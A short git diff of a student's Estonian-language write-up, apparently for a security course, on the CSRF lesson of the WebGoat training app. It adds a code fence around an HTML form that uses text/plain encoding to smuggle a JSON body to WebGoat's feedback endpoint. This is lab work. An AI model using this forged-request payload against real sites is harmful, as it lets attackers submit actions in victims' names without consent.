@@ -6,10 +6,12 @@
 8 CSRF) Kuna webwolfi .html faili üleslaadimisega on mingi probleem, millele internetist lahendust ei leidnud, siis ei saa seda lõpuni teha, aga postitan lahenduskäigu, mis peaks töötama.
 HTML kood, mis failis olema peaks:
 127.0.0.1 on minu kali IP.
+```html
 <form enctype="text/plain" method="POST" action="http:/127.0.0.1:8080/WebGoat/csrf/feedback/message">
 	<input type="hidden" name='{"name": "WebGoat", "email": "webgoat@webgoat.org", "content": "WebGoat is the best!!", "ignoreme":"' value='sdfsdfdf"}'>
 	<button>submit</button>
-</form> 
+</form>
+```
 <br>
 ![image](https://github.com/JoosepPodekrat/Andmeturve2024/assets/144919619/95c22a2f-05fd-4956-944a-8c154ecb82d6)
 
